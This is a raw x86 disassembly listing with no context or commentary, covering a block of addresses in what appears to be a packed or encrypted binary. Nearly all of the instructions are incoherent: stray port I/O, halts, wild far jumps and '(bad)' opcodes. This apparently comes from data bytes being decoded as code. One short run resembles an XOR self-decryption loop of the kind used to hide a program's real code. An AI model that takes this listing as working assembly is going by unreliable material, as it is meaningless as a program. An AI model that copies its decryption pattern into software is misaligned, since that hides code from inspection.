  40b7dc:	scas   al,BYTE PTR es:[edi]
  40b7dd:	add    al,0x42
  40b7df:	mov    DWORD PTR [edi-0x46],0x23844bdc
  40b7e6:	shl    al,1
  40b7e8:	out    0xec,eax
  40b7ea:	call   0xe370:0x551539d
  40b7f1:	mov    ds:0x3d5476cc,al
  40b7f6:	int3   
  40b7f7:	dec    esi
  40b7f8:	adc    esi,0xffffff95
  40b7fb:	mov    al,ds:0x4f230176
  40b800:	es out dx,eax
  40b802:	xchg   ecx,eax
  40b803:	mov    esi,cs
  40b805:	add    eax,0x4858e331
  40b80a:	aad    0x96
  40b80c:	cs jle 0x40b7c5
  40b80f:	xlat   BYTE PTR ds:[ebx]
  40b810:	adc    al,0x10
  40b812:	jmp    0xedf35d5a
  40b817:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b818:	xor    BYTE PTR [edx+eiz*4-0x282977af],al
  40b81f:	or     esi,DWORD PTR [esi+ebx*2+0x4c]
  40b823:	jnp    0x40b7a7
  40b825:	xor    BYTE PTR [edi],bh
  40b827:	repz mov ebp,0x92c53162
  40b82d:	outs   dx,DWORD PTR ds:[esi]
  40b82e:	hlt    
  40b82f:	test   BYTE PTR [ecx-0x5a1af0f2],al
  40b835:	cmp    bh,BYTE PTR [edi-0x4815614a]
  40b83b:	lods   al,BYTE PTR ds:[esi]
  40b83c:	pop    edx
  40b83d:	cmp    ebx,eax
  40b83f:	mov    esp,es
  40b841:	xor    eax,0x4fa34829
  40b846:	sti    
  40b847:	push   cs
  40b848:	push   ds
  40b849:	out    0x72,al
  40b84b:	lds    ebp,FWORD PTR [ebx-0x33]
  40b84e:	das    
  40b84f:	mov    edx,DWORD PTR [ebx+0x1643d3c6]
  40b855:	pop    es
  40b856:	jg     0x40b7fd
  40b858:	cwde   
  40b859:	fstp   QWORD PTR [ebx+0x14]
  40b85c:	cld    
  40b85d:	mov    ds,WORD PTR [edx+0x34]
  40b860:	fs jnp 0x40b7f1
  40b863:	leave  
  40b864:	push   eax
  40b865:	pop    ss
  40b866:	pop    ebp
  40b867:	hlt    
  40b868:	in     eax,0x5e
  40b86a:	or     edi,DWORD PTR [ebp+0x43ce218c]
  40b870:	adc    BYTE PTR [edx-0x689d4a44],0xe7
  40b877:	or     BYTE PTR [eax-0x50],ah
  40b87a:	icebp  
  40b87b:	hlt    
  40b87c:	push   ecx
  40b87d:	or     al,0x67
  40b87f:	std    
  40b880:	and    al,0x1c
  40b882:	xor    ebx,DWORD PTR gs:[ecx+0x7a]
  40b886:	cmc    
  40b887:	jns    0x40b86e
  40b889:	loopne 0x40b8cf
  40b88b:	cs jg  0x40b860
  40b88e:	or     DWORD PTR [eax-0x18],ecx
  40b891:	out    0xcf,al
  40b893:	push   ds
  40b894:	push   esi
  40b895:	add    BYTE PTR [eax],dh
  40b897:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b898:	lock mov ebp,0x2f5da0bd
  40b89e:	aad    0xa
  40b8a0:	push   ebx
  40b8a1:	xchg   ecx,eax
  40b8a2:	sbb    DWORD PTR [eax+0x36e7c3d5],edx
  40b8a8:	pusha  
  40b8a9:	(bad)  
  40b8aa:	pop    ebp
  40b8ab:	int3   
  40b8ac:	sub    eax,DWORD PTR [esi+0x56c41c74]
  40b8b2:	cmp    ch,0xc7
  40b8b5:	popf   
  40b8b6:	mul    DWORD PTR [edi]
  40b8b8:	and    esi,DWORD PTR [ebx-0x13]
  40b8bb:	dec    eax
  40b8bc:	cmp    edx,DWORD PTR fs:[ecx-0x39c650cd]
  40b8c3:	hlt    
  40b8c4:	jp     0xa60f3ad5
  40b8ca:	fadd   QWORD PTR [esi-0x16]
  40b8cd:	jge    0x40b8be
  40b8cf:	pop    es
  40b8d0:	and    eax,0x11012e0f
  40b8d5:	sub    DWORD PTR [edi+0x59],0xee55e9af
  40b8dc:	mov    ah,0x82
  40b8de:	mov    bl,0xa9
  40b8e0:	jmp    FWORD PTR [ecx]
  40b8e2:	popf   
  40b8e3:	cld    
  40b8e4:	cmp    ebx,DWORD PTR [ebx-0x39]
  40b8e7:	neg    DWORD PTR [edx-0x6]
  40b8ea:	gs mov al,0x61
  40b8ed:	push   es
  40b8ee:	mov    esi,0xb621e755
  40b8f3:	jno    0x40b8c3
  40b8f5:	jbe    0x40b92d
  40b8f7:	mov    esp,0x41327b29
  40b8fc:	iret   
  40b8fd:	std    
  40b8fe:	ins    BYTE PTR es:[edi],dx
  40b8ff:	pop    eax
  40b900:	jl     0x40b914
  40b902:	cmp    ch,ch
  40b904:	fld    st(6)
  40b906:	xchg   BYTE PTR [esp+eax*8],bl
  40b909:	sbb    eax,0x275e4b1f
  40b90e:	fst    DWORD PTR [edi+edx*4+0x3dda67a2]
  40b915:	(bad)  
  40b916:	test   al,0x31
  40b918:	jnp    0x40b929
  40b91a:	test   BYTE PTR [edi],ah
  40b91c:	add    eax,DWORD PTR [eax]
  40b91e:	add    BYTE PTR [ebx+0x2081f045],cl
  40b924:	sbb    BYTE PTR [esi*2-0x3451700],0xff
  40b92c:	(bad)  
  40b92d:	jmp    0x40bc46
  40b932:	into   
  40b933:	aas    
  40b934:	ds ror ebp,0xc1
  40b938:	rcl    ebx,1
  40b93a:	add    esi,DWORD PTR [edi]
  40b93c:	stos   DWORD PTR es:[edi],eax
  40b93d:	ror    DWORD PTR [edi-0x3934cb0b],cl
  40b943:	mov    WORD PTR [eax+0x78],?
  40b946:	je     0x40b9c6
  40b948:	js     0x40b9c2
  40b94a:	out    dx,eax
  40b94b:	jmp    0x40b916
  40b94d:	jecxz  0x40b911
  40b94f:	aad    0x39
  40b951:	jecxz  0x40b927
  40b953:	retf   0x13f4
  40b956:	jge    0x40b8e4
  40b958:	hlt    
  40b959:	add    DWORD PTR [ebx+0x60c1ddc8],esi
  40b95f:	rol    DWORD PTR [esi-0x20],0xb6
  40b963:	in     al,0x51
  40b965:	add    dl,BYTE PTR [esi-0x4b]
  40b968:	inc    ebx
  40b969:	pop    ds
  40b96a:	fdiv   DWORD PTR [ecx]
  40b96c:	jmp    FWORD PTR [esi]
  40b96e:	cdq    
  40b96f:	xchg   DWORD PTR [edx+0x61d675dd],esp
  40b975:	out    dx,al
  40b976:	(bad)  
  40b977:	out    dx,eax
  40b978:	push   0x44c58377
  40b97d:	popa   
  40b97e:	push   ecx
  40b97f:	mov    ebx,0xb3196386
  40b984:	xchg   esi,eax
  40b985:	cli    
  40b986:	sar    eax,1
  40b988:	pop    esp
  40b989:	push   esp
  40b98a:	mov    ch,0x5f
  40b98c:	xchg   DWORD PTR [ebp+0x7a],esi
  40b98f:	mov    bl,0x42
  40b991:	out    dx,eax
  40b992:	lock fsub DWORD PTR [ecx+0x65]
  40b996:	test   DWORD PTR [edi-0x1d9e199],edx
  40b99c:	int    0xb0
  40b99e:	pop    ss
  40b99f:	inc    edi
  40b9a0:	jl     0x40b996
  40b9a2:	mov    cl,0x62
  40b9a4:	and    DWORD PTR [eax],ebx
  40b9a6:	adc    si,sp
  40b9a9:	fnstsw WORD PTR [ecx+esi*4+0x74714b26]
  40b9b0:	push   0xb8013207
  40b9b5:	stos   DWORD PTR es:[edi],eax
  40b9b6:	or     al,0x29
  40b9b8:	data16 das 
  40b9ba:	fdiv   QWORD PTR [ebx-0x66]
  40b9bd:	hlt    
  40b9be:	and    DWORD PTR [edx-0xb],0x15018236
  40b9c5:	in     al,0x4b
  40b9c7:	and    ecx,DWORD PTR [edi-0x7e]
  40b9ca:	push   0x37c34495
  40b9cf:	jnp    0x40b96d
  40b9d1:	adc    ecx,eax
  40b9d3:	xor    esi,DWORD PTR [edx-0x2f]
  40b9d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b9d7:	ret    
  40b9d8:	jge    0x40b9ce
  40b9da:	(bad)  
  40b9db:	fist   WORD PTR [eax+0x727a23c6]
  40b9e1:	cld    
  40b9e2:	in     eax,dx
  40b9e3:	jns    0x40b9f6
  40b9e5:	or     esi,DWORD PTR [edi-0x5]
  40b9e8:	push   esi
  40b9e9:	cmp    BYTE PTR [ecx-0x1d94c3ef],ah
  40b9ef:	int    0xc
  40b9f1:	jmp    0xd38318af
  40b9f6:	mov    ecx,0xbbfbbd33
  40b9fb:	inc    edi
  40b9fc:	scas   eax,DWORD PTR es:[edi]
  40b9fd:	jmp    0x62c7cb16
  40ba02:	sub    BYTE PTR [esi],al
  40ba04:	lock adc eax,0x3f87e63
  40ba0a:	pop    esi
  40ba0b:	adc    eax,0x50120576
  40ba10:	(bad)  
  40ba11:	dec    edx
  40ba12:	inc    ebx
  40ba13:	int3   
  40ba14:	cdq    
  40ba15:	xor    BYTE PTR [edx],0xab
  40ba18:	sar    DWORD PTR [ebx],cl
  40ba1a:	call   0xf4a704bd
  40ba1f:	pop    ecx
  40ba20:	inc    esp
  40ba21:	imul   esp,DWORD PTR [ebx],0x3e
  40ba24:	push   ebx
  40ba25:	push   ebx
  40ba26:	inc    edi
  40ba27:	fsub   st(4),st
  40ba29:	mov    cl,0x74
  40ba2b:	jl     0x40baa4
  40ba2d:	fadd   DWORD PTR gs:[edx+0x210f00]
  40ba34:	add    ebx,DWORD PTR [ecx-0x7a8b3657]
  40ba3a:	aad    0x7d
  40ba3c:	and    bl,bl
  40ba3e:	(bad)
  40ba42:	aaa    
  40ba43:	call   0xe5490d73
  40ba48:	mov    esi,0xf89d062d
  40ba4d:	es pop ebx
  40ba4f:	and    al,BYTE PTR [edx+0xe]
  40ba52:	push   ebx
  40ba53:	jmp    0x9fbbed71
  40ba58:	jae    0x40bac6
  40ba5a:	dec    ebp
  40ba5b:	mov    bl,0x6f
  40ba5d:	dec    ecx
  40ba5e:	jb     0x40ba04
  40ba60:	jl     0x40ba32
  40ba62:	mov    edx,DWORD PTR [eax-0x750f42c9]
  40ba68:	jmp    0xc2e:0x7aacb463
  40ba6f:	dec    edi
  40ba70:	(bad)  
  40ba71:	jno    0x40baba
  40ba73:	call   0xcc04a079
  40ba78:	adc    edx,DWORD PTR [esi]
  40ba7a:	data16 add al,BYTE PTR [esi]
  40ba7d:	dec    eax
  40ba7e:	sub    eax,0x868241f2
  40ba83:	ret    0x391a
  40ba86:	ret    
  40ba87:	jmp    0x7aaeebdc
  40ba8c:	enter  0x27db,0xc9
  40ba90:	jnp    0x40bae2
  40ba92:	call   0x8d7f6e3c
  40ba97:	push   ecx
  40ba98:	inc    ecx
  40ba99:	(bad)
  40ba9d:	inc    esi
  40ba9e:	gs jb  0x40badd
  40baa1:	popf   
  40baa2:	iret   
  40baa3:	inc    edi
  40baa4:	jmp    0x33ed:0xbd0bf371
  40baab:	stc    
  40baac:	jne    0x40bad8
  40baae:	push   esp
  40baaf:	pop    ss
  40bab0:	and    al,0x6d
  40bab2:	inc    esp
  40bab3:	inc    esi
  40bab4:	xor    ah,BYTE PTR [ecx-0x46]
  40bab7:	push   esp
  40bab8:	inc    ebx
  40bab9:	test   eax,0x81d4f469
  40babe:	or     DWORD PTR [eax+0x3c01e9b7],edi
  40bac4:	repz out dx,eax
  40bac6:	lds    edi,FWORD PTR [edx+0x5315d189]
  40bacc:	fs call 0x2307:0xdfe1c317
  40bad4:	or     eax,0xdadf7b36
  40bad9:	adc    BYTE PTR [edi+eiz*8-0x9],ah
  40badd:	mov    bl,0xd3
  40badf:	je     0x40bad3
  40bae1:	ret    
  40bae2:	xor    DWORD PTR [edi],edx
  40bae4:	stc    
  40bae5:	fadd   QWORD PTR [ebp+0x18]
  40bae8:	test   al,0xdf
  40baea:	cld    
  40baeb:	fistp  WORD PTR [eax+0x29]
  40baee:	repz call 0x26b387ab
  40baf4:	aam    0x7b
  40baf6:	xor    DWORD PTR [eax+0x33],eax
  40baf9:	adc    DWORD PTR [esi+0x5a],ebx
  40bafc:	xchg   edx,eax
  40bafd:	pop    ss
  40bafe:	daa    
  40baff:	xchg   ecx,eax
  40bb00:	adc    eax,0x74b44949
  40bb05:	sar    DWORD PTR [esi+edx*2],0x7e
  40bb09:	add    eax,0xb32eec64
  40bb0e:	pop    edi
  40bb0f:	jo     0x40bb68
  40bb11:	mov    al,ds:0x6bdddac1
  40bb16:	jns    0x40bb5f
  40bb18:	outs   dx,BYTE PTR ds:[esi]
  40bb19:	mov    esi,0xe8a9d7d5
  40bb1e:	sub    eax,0xe52ca97
  40bb23:	aam    0xa6
  40bb25:	std    
  40bb26:	lock xor al,0x96
  40bb29:	or     cl,BYTE PTR [ebx+0x7d]
  40bb2c:	rcr    BYTE PTR [esi],cl
  40bb2e:	inc    eax
  40bb2f:	pop    esi
  40bb30:	in     eax,dx
  40bb31:	sbb    ch,BYTE PTR [ebx+0x4c]
  40bb34:	(bad)  
  40bb35:	jae    0x40bac3
  40bb37:	leave  
  40bb38:	jno    0x40bba8
  40bb3a:	sub    eax,0x456e7386
  40bb3f:	pop    edi
  40bb40:	or     al,ch
  40bb42:	push   es
  40bb43:	addr16 stc 
  40bb45:	js     0x40bafd
  40bb47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb48:	jae    0x40bb16
  40bb4a:	adc    ecx,DWORD PTR [edx-0x663201dd]
  40bb50:	pusha  
  40bb51:	or     dh,bh
  40bb53:	out    dx,eax
  40bb54:	fnstsw WORD PTR [esi+0x302d3156]
  40bb5a:	rol    esp,cl
  40bb5c:	mov    ebp,DWORD PTR [ecx+0x60516ba6]
  40bb62:	enter  0x7f0c,0x3
  40bb66:	jae    0x40bb8c
  40bb68:	in     eax,0x2c
  40bb6a:	lds    ebp,FWORD PTR [esi+0x4e]
  40bb6d:	or     al,0xcf
  40bb6f:	(bad)  
  40bb70:	popa   
  40bb71:	dec    ecx
  40bb72:	out    0xeb,al
  40bb74:	dec    ebp
  40bb75:	aad    0x98
  40bb77:	mov    ax,ds:0x3279cc33
  40bb7d:	in     eax,dx
  40bb7e:	jle    0x40bb70
  40bb80:	jno    0x40bb92
  40bb82:	loope  0x40bbb0
  40bb84:	ret    0x2a75
  40bb87:	mov    ebp,0x6e096ab8
  40bb8c:	sub    ebx,DWORD PTR [edx+0x0]
  40bb8f:	mov    BYTE PTR [ecx-0x57],al
  40bb92:	mov    cl,0x9d
  40bb94:	cs (bad) 
  40bb97:	inc    esi
  40bb98:	stos   DWORD PTR es:[edi],eax
  40bb99:	cld    
  40bb9a:	jb     0x40bbcb
  40bb9c:	hlt    
  40bb9d:	push   esp
  40bb9e:	ins    BYTE PTR es:[edi],dx
  40bb9f:	mov    ah,0xb8
  40bba1:	mov    eax,ds:0x30e8398
  40bba6:	pop    ecx
  40bba7:	pop    ebp
  40bba8:	add    DWORD PTR [ecx],edx
  40bbaa:	push   esp
  40bbab:	int    0x22
  40bbad:	mov    ebx,0xf7104095
  40bbb2:	pop    es
  40bbb3:	sbb    DWORD PTR [edi+0x46c9a8c0],ebp
  40bbb9:	and    DWORD PTR [ecx+0x5d],esp
  40bbbc:	sub    dl,BYTE PTR ds:0x4b074303
  40bbc2:	sub    DWORD PTR [edx+0x5e139a24],eax
  40bbc8:	in     al,0xe5
  40bbca:	pop    esi
  40bbcb:	mov    al,0x38
  40bbcd:	das    
  40bbce:	outs   dx,BYTE PTR ds:[esi]
  40bbcf:	dec    edi
  40bbd0:	inc    esp
  40bbd1:	out    dx,al
  40bbd2:	in     eax,dx
  40bbd3:	fmul   QWORD PTR [eax-0x57]
  40bbd6:	out    dx,al
  40bbd7:	clc    
  40bbd8:	push   esi
  40bbd9:	shl    DWORD PTR [edx+ecx*1-0x18086d76],0x60
  40bbe1:	add    DWORD PTR [eax+0x5655c581],ebx
  40bbe7:	xor    DWORD PTR [esi+0x8d6e715],edi
  40bbed:	jecxz  0x40bb7c
  40bbef:	(bad)  
  40bbf0:	mov    ebp,0x49b5a9a1
  40bbf5:	mov    ch,0x72
  40bbf7:	dec    edi
  40bbf8:	mov    al,0x92
  40bbfa:	jne    0x40bc0a
  40bbfc:	(bad)  
  40bbfd:	call   0x5ca22227
  40bc02:	cs jge 0x40bc41
  40bc05:	and    DWORD PTR [edi-0x12326518],ebp
  40bc0b:	mov    esi,0x646365c2
  40bc10:	adc    DWORD PTR [esi+0x399dc248],ebp
  40bc16:	sar    BYTE PTR [edi+eiz*8],cl
  40bc19:	mov    dh,0x99
  40bc1b:	push   ebx
  40bc1c:	je     0x40bc71
  40bc1e:	mov    ch,0x13
  40bc20:	xchg   esp,eax
  40bc21:	add    BYTE PTR [ebx+0x1c5f15bd],cl
  40bc27:	xchg   ebx,eax
  40bc28:	test   eax,ebx
  40bc2a:	xchg   DWORD PTR [ebx-0x6d2211cf],esi
  40bc30:	cdq    
  40bc31:	loop   0x40bc00
  40bc33:	shl    DWORD PTR [eax-0x27],0x22
  40bc37:	sar    DWORD PTR [esi-0x12],0xd8
  40bc3b:	push   0xadf29914
  40bc40:	adc    al,0x35
  40bc42:	lock imul ebx,eax,0xffffffe7
  40bc46:	mov    eax,DWORD PTR [ebp-0xc]
  40bc49:	mov    edx,DWORD PTR [ebp-0x18]
  40bc4c:	or     eax,edx
  40bc4e:	cmp    eax,0xfa9f7e76
  40bc53:	je     0x40bc67
  40bc59:	mov    eax,DWORD PTR [ebp-0x10]
  40bc5c:	xor    DWORD PTR [eax],0x2650fa8e
  40bc62:	jmp    0x40b5e7
  40bc67:	mov    ax,WORD PTR [ebp-0x4]
  40bc6b:	jmp    0x40bf84
  40bc70:	(bad)  
  40bc71:	ds ret 
  40bc73:	ror    bl,cl
  40bc75:	rcl    ebp,1
  40bc77:	fisubr DWORD PTR [ebp+0x56]
  40bc7a:	xchg   esp,eax
  40bc7b:	jge    0x40bc21
  40bc7d:	inc    ebp
  40bc7e:	xchg   edi,eax
  40bc7f:	jb     0x40bc43
  40bc81:	xchg   ecx,eax
  40bc82:	js     0x40bcfc
  40bc84:	je     0x40bd04
  40bc86:	js     0x40bd00
  40bc88:	and    BYTE PTR [edi],ch
  40bc8a:	jno    0x40bc4f
  40bc8c:	data16 std 
  40bc8e:	jmp    0x40bcee
  40bc90:	mov    DWORD PTR [edx],ebp
  40bc92:	sub    edx,DWORD PTR [ecx]
  40bc94:	xchg   ebx,eax
  40bc95:	aas    
  40bc96:	push   eax
  40bc97:	xchg   edi,eax
  40bc98:	sahf   
  40bc99:	jl     0x40bc4c
  40bc9b:	ins    DWORD PTR es:[edi],dx
  40bc9c:	xor    eax,0x2d4bf04d
  40bca1:	push   cs
  40bca2:	out    dx,al
  40bca3:	popf   
  40bca4:	(bad)  
  40bca5:	sub    DWORD PTR [esi],ecx
  40bca7:	fbld   TBYTE PTR [edi-0xc]
  40bcaa:	out    0x78,eax
  40bcac:	jbe    0x40bd1f
  40bcae:	mov    ss,WORD PTR [edx+0x32]
  40bcb1:	cs push ebp
  40bcb3:	imul   ebp,edi,0xfa89ea0c
  40bcb9:	test   dh,bl
  40bcbb:	sbb    dl,BYTE PTR [eax]
  40bcbd:	retf   
  40bcbe:	cmp    BYTE PTR [edi-0x26],0x43
  40bcc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bcc3:	mov    esp,0xad3ac020
  40bcc8:	scas   al,BYTE PTR es:[edi]
  40bcc9:	cmp    DWORD PTR [eax+esi*4+0x63],0xb338408e
  40bcd1:	hlt    
  40bcd2:	or     al,0x6a
  40bcd4:	(bad)  
  40bcd5:	lock xor al,0xa6
  40bcd9:	cmp    ebx,0x38f5de94
  40bcdf:	adc    al,0x33
  40bce1:	pop    ebx
  40bce2:	jne    0x40bd21
  40bce4:	mov    ebp,ebp
  40bce6:	pop    edx
  40bce7:	push   edx
  40bce8:	xchg   esp,eax
  40bce9:	rcr    BYTE PTR [eax-0x14],1
  40bcec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bced:	int3   
  40bcee:	mov    DWORD PTR [ebp+esi*4-0xadde9c2],edi
  40bcf5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bcf6:	xchg   ebp,eax
  40bcf7:	mov    ds:0x5bfd56b8,al
  40bcfc:	ja     0x40bcb9
  40bcfe:	cli    
  40bcff:	jns    0x40bd4e
  40bd01:	cmp    al,0xa
  40bd03:	jo     0x40bd19
  40bd05:	mov    edi,0x1c902832
  40bd0a:	mov    esi,0xaac92356
  40bd0f:	cdq    
  40bd10:	out    0x4f,al
  40bd12:	xor    eax,0x56e7056e
  40bd17:	in     eax,0x6e
  40bd19:	aam    0xb9
  40bd1b:	mov    eax,0x144bbe8f
  40bd20:	fild   QWORD PTR [edx+0x7e1c854d]
  40bd26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd27:	mov    ds:0x15ab04e8,eax
  40bd2c:	adc    ecx,DWORD PTR [ecx+0x0]
  40bd2f:	outs   dx,DWORD PTR ds:[esi]
  40bd30:	lods   eax,DWORD PTR ds:[esi]
  40bd31:	jmp    0xa802:0x8555de91
  40bd38:	add    ebx,DWORD PTR [ecx-0x240037bd]
  40bd3e:	xor    al,0x21
  40bd40:	sti    
  40bd41:	mov    al,ds:0x8768a7d5
  40bd46:	jae    0x40bd43
  40bd48:	scas   al,BYTE PTR es:[edi]
  40bd49:	call   0x216e:0x8e5b7b37
  40bd50:	pop    es
  40bd51:	jecxz  0x40bd34
  40bd53:	test   DWORD PTR [ebx+ecx*4+0x2b],esp
  40bd57:	lds    ecx,FWORD PTR [ebx]
  40bd59:	mov    bh,0x17
  40bd5b:	ins    DWORD PTR es:[edi],dx
  40bd5c:	outs   dx,DWORD PTR ds:[esi]
  40bd5d:	icebp  
  40bd5e:	mov    cl,0x67
  40bd60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd61:	pop    ebx
  40bd62:	mov    bl,0x44
  40bd64:	retf   
  40bd65:	stos   BYTE PTR es:[edi],al
  40bd66:	outs   dx,BYTE PTR ds:[esi]
  40bd67:	dec    ecx
  40bd68:	add    eax,0x3cf7ffce
  40bd6d:	ss (bad) 
  40bd6f:	push   es
  40bd70:	pop    ecx
  40bd71:	loopne 0x40bd70
  40bd73:	jbe    0x40bd52
  40bd75:	test   al,0x82
  40bd77:	fld    TBYTE PTR [ebp-0x10]
  40bd7b:	fisttp DWORD PTR [esi]
  40bd7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd7e:	jbe    0x40bdf3
  40bd80:	popf   
  40bd81:	aam    0x19
  40bd83:	fldenv [edx+0x1f1e7109]
  40bd89:	fnstcw WORD PTR [esp+edi*1]
  40bd8c:	adc    BYTE PTR [edi],cl
  40bd8e:	ss ja  0x40bd63
  40bd91:	pop    esi
  40bd92:	add    esp,0xffffff99
  40bd95:	xchg   ebx,eax
  40bd96:	out    0x2c,al
  40bd98:	xchg   ebp,eax
  40bd99:	jb     0x40be03
  40bd9b:	jo     0x40bdef
  40bd9d:	sbb    ch,BYTE PTR [ecx-0x5d]
  40bda0:	and    al,0x4
  40bda2:	sub    DWORD PTR fs:[ebx],ebp
  40bda5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bda6:	rcr    DWORD PTR [ecx+0x2f6e5fb5],cl
  40bdac:	nop
  40bdad:	mov    WORD PTR [eax+edx*4+0x5c],ss
  40bdb1:	cs push ss
  40bdb3:	sub    ah,ah
  40bdb5:	push   ebp
  40bdb6:	rcr    BYTE PTR [edi],0x15
  40bdb9:	cdq    
  40bdba:	dec    ebp
  40bdbb:	or     DWORD PTR [ecx+esi*1-0x36],esp
  40bdbf:	in     eax,0x20
  40bdc1:	inc    edx
  40bdc2:	and    ecx,DWORD PTR [edi-0x2333ebe6]
  40bdc8:	int3   
  40bdc9:	nop
  40bdca:	xchg   esi,eax
  40bdcb:	mov    bl,0x6b
  40bdcd:	dec    edx
  40bdce:	cdq    
  40bdcf:	shl    DWORD PTR [ebx],0x6b
  40bdd2:	inc    ebx
  40bdd3:	add    eax,0xf3a2c45e
  40bdd8:	aad    0x3e
  40bdda:	adc    BYTE PTR [edi+0xf339de1],0xcd
  40bde1:	jo     0x40be48
  40bde3:	das    
  40bde4:	and    bl,0xf3
  40bde7:	daa    
  40bde8:	cdq    
  40bde9:	mov    ds:0xaf88bfdb,al
  40bdee:	cdq    
  40bdef:	je     0x40bd8e
  40bdf1:	pop    ss
  40bdf2:	sbb    eax,0xbfec2629
  40bdf7:	scas   eax,DWORD PTR es:[edi]
  40bdf8:	xor    bh,al
  40bdfa:	hlt    
  40bdfb:	adc    al,0x8
  40bdfd:	aad    0x74
  40bdff:	cs mov ebx,0x898fdf39
  40be05:	loopne 0x40bde9
  40be07:	mov    WORD PTR [ebx-0x26],fs
  40be0a:	xor    al,0x7a
  40be0c:	rcl    BYTE PTR [edx+ecx*4+0x56],cl
  40be10:	jp     0x40bd9e
  40be12:	cli    
  40be13:	or     esp,DWORD PTR [eax-0xc300779]
  40be19:	cmp    DWORD PTR [edi+0x7153bfc8],esi
  40be1f:	or     al,0x8c
  40be21:	js     0x40be6a
  40be23:	inc    BYTE PTR [ecx-0x65c615a3]
  40be29:	lea    ebp,ds:0x5b5f3363
  40be2f:	pop    ebx
  40be30:	mov    WORD PTR [esi+0x27f13369],ss
  40be36:	loopne 0x40bddc
  40be38:	repz les edx,FWORD PTR [esi-0x1]
  40be3c:	or     al,0xc1
  40be3e:	pop    ecx
  40be3f:	mov    bl,0x81
  40be41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be42:	mov    DWORD PTR [ebp-0x31],ebx
  40be45:	jmp    0xe3ea:0xf64fa200
  40be4c:	inc    ecx
  40be4d:	mov    edx,0xc6a0c012
  40be52:	mov    al,ds:0x122f691f
  40be57:	dec    edx
  40be58:	jmp    0x40bead
  40be5a:	push   cs
  40be5b:	dec    ebx
  40be5c:	push   ebx
  40be5d:	ins    DWORD PTR es:[edi],dx
  40be5e:	xchg   esi,eax
  40be5f:	xchg   edx,eax
  40be60:	add    edi,DWORD PTR [edi-0x3862a21]
  40be66:	sti    
  40be67:	cmp    eax,0x911b4892
  40be6c:	jle    0x40be45
  40be6e:	sti    
  40be6f:	push   edi
  40be70:	xchg   esp,eax
  40be71:	cmc    
  40be72:	cwde   
  40be73:	imul   ebx,DWORD PTR [ebx],0x2a19b313
  40be79:	mov    dl,0x8d
  40be7b:	mov    ds:0x1dc3911,al
  40be80:	js     0x40bee4
  40be82:	jno    0x40beef
  40be84:	pop    edi
  40be85:	pop    ds
  40be86:	repnz cwde 
  40be88:	outs   dx,DWORD PTR ds:[esi]
  40be89:	dec    eax
  40be8a:	jno    0x40bebd
  40be8c:	aad    0xda
  40be8e:	outs   dx,BYTE PTR ds:[esi]
  40be8f:	or     BYTE PTR [esi+0x5b],bh
  40be92:	sub    edi,DWORD PTR [edi+0x25]
  40be95:	jge    0x40bece
  40be97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be98:	int    0x80
  40be9a:	mov    ebp,0xa90630ae
  40be9f:	sbb    BYTE PTR [eax+0x75d7bd57],0x14
  40bea6:	(bad)  
  40bea7:	cmp    BYTE PTR [edx-0x1a],al
  40beaa:	cmp    ebx,ebx
  40beac:	sbb    al,0x22
  40beae:	aad    0xa9
  40beb0:	in     eax,dx
  40beb1:	icebp  
  40beb2:	scas   eax,DWORD PTR es:[edi]
  40beb3:	dec    edi
  40beb4:	pushf  
  40beb5:	mov    ds:0xd7122f44,al
  40beba:	ins    DWORD PTR es:[edi],dx
  40bebb:	in     eax,0x18
  40bebd:	addr16 push 0xafb182ba
  40bec3:	sar    ebp,cl
  40bec5:	jecxz  0x40be73
  40bec7:	xchg   ebx,eax
  40bec8:	xchg   ebx,eax
  40bec9:	pop    edi
  40beca:	and    DWORD PTR gs:[ebp+0x759858f5],0x7a013b19
  40bed5:	loop   0x40bed8
  40bed7:	ja     0x40bf26
  40bed9:	test   al,0xb9
  40bedb:	(bad)  
  40bedc:	push   esi
  40bedd:	(bad)  
  40bede:	clc    
  40bedf:	out    0x94,eax
  40bee1:	retf   0x2a8d
  40bee4:	loop   0x40bf1c
  40bee6:	shr    DWORD PTR [edx-0x4513d7aa],1
  40beec:	dec    esp
  40beed:	mov    esp,0x3490b8c2
  40bef2:	gs hlt 
  40bef4:	retf   0xf363
  40bef7:	inc    eax
  40bef8:	mov    ebp,0xbd4c815f
  40befd:	jb     0x40bf00
  40beff:	lahf   
  40bf00:	cmp    DWORD PTR [edi+0x60587811],eax
  40bf06:	xor    ch,dl
  40bf08:	mov    edi,DWORD PTR [ecx]
  40bf0a:	xchg   esi,eax
  40bf0b:	les    eax,FWORD PTR [ecx]
  40bf0d:	cmp    BYTE PTR [ebx+ebx*1+0xc],bh
  40bf11:	adc    bl,cl
  40bf13:	or     al,0x2a
  40bf15:	mov    eax,ds:0x5181c4d7
  40bf1a:	lods   al,BYTE PTR ds:[esi]
  40bf1b:	jne    0x40beff
  40bf1d:	add    eax,0x2b5e8770
  40bf22:	add    edi,DWORD PTR [esp+edx*1-0x48336167]
  40bf29:	lds    ebx,FWORD PTR [esi-0x62]
  40bf2c:	data16 ins BYTE PTR es:[edi],dx
  40bf2e:	or     DWORD PTR es:0x2d107088,0x52
  40bf36:	jmp    0x40bf8f
  40bf38:	loope  0x40bf87
  40bf3a:	fisttp DWORD PTR [ebx+eax*4]
  40bf3d:	pop    ds
  40bf3e:	inc    esi
  40bf3f:	aaa    
  40bf40:	repz inc ecx
  40bf42:	push   0xa2f90a4d
  40bf47:	rcr    DWORD PTR [ebx-0xa8878d7],1
  40bf4d:	pop    eax
  40bf4e:	dec    edi
  40bf4f:	call   0x3b68:0xe96ecdb1
  40bf56:	test   BYTE PTR [eax+0x48],ch
  40bf59:	test   DWORD PTR [edi+edx*1+0x4b32628c],esi
  40bf60:	or     dl,ah
  40bf62:	imul   eax,esp,0x1d
